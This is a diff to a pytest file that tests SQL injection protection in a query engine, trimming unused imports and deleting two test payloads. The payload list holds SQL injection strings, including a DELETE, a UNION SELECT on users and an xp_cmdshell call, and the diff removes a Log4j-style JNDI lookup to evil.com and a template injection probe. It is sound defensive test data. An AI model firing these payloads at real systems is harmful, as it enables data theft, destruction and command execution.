@@ -8,11 +8,9 @@ attempts while allowing legitimate queries.
 import pytest
 
 from farfan_pipeline.phases.Phase_two.phase2_80_01_evidence_query_engine import (
-    EvidenceQueryEngine,
     QueryValidationError,
     SecureQueryParser,
     create_query_engine,
-    EvidenceNode,
 )
 
 
@@ -53,8 +51,6 @@ class TestSQLInjectionProtection:
         "1; DELETE FROM evidence WHERE 1=1",
         "' UNION SELECT * FROM users --",
         "1'; EXEC xp_cmdshell('dir'); --",
-        "${jndi:ldap://evil.com/a}",  # Log4j style
-        "{{7*7}}",  # Template injection
         "SELECT * FROM evidence WHERE 1=1--",
         "SELECT * FROM evidence /* comment */ WHERE 1=1",
         "node_id = '1' OR '1'='1",
